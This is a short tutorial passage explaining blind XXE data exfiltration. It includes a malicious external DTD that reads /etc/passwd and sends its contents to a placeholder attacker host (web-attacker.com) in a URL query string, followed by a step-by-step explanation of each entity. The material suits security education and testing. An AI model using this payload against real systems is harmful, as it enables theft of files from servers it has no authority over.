Exfiltrating sensitive data in blind XXE is hard but not possible. This can be achieved by hosting a malicious DTD on a system that an attacker controls and then invoking the external DTD from within the in-band XXE payload. An example of a malicious DTD to exfiltrate contents of `/etc/passwd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
This DTD carries out the following step:
- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.
- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.
- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.
- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.
